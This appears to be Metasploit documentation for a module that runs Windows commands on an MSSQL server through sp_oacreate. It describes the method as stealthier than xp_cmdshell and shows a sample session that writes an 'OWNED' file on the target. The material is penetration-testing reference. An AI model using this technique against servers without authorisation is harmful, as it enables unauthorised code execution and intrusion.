## Description

This module allows you to execute a Windows command on a MSSQL/MSDE instance via the sp_oacreate procedure (ole) instead of the often used xp_cmdshell. This function is used in metasploit to rebuild the xp_cmdshell stored procedure but can be used directly to get code execution which is the more opsec safe way.

## Verification Steps

1. Do: ```use use admin/mssql/mssql_exec_oacreate```
2. Do: ```set USERNAME [username1]```
1. Do: ```set PASSWORD [password1]```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set CMD [command]```
4. Do: ```run```

## Scenarios

```
msf > use use use admin/mssql/mssql_exec_oacreate
msf auxiliary(mssql_exec_oacreate) > set USERNAME username1
USERNAME => username1
msf auxiliary(mssql_exec_oacreate) > set PASSWORD password1
PASSWORD => password1
msf auxiliary(mssql_exec_oacreate) > set RHOST 192.168.1.195
RHOST => 192.168.1.195
msf auxiliary(mssql_exec_oacreate) > set CMD cmd.exe /c echo OWNED > C:\owned.txt
CMD => cmd.exe /c echo OWNED > C:\owned.txt
msf auxiliary(mssql_exec_oacreate) > run

[*] 192.168.1.195:1433 - Enable advanced options and ole automation procedures
[*] 192.168.1.195:1433 - Executing command using sp_oacreate
[*] Auxiliary module execution completed
msf auxiliary(mssql_exec_oacreate) >
```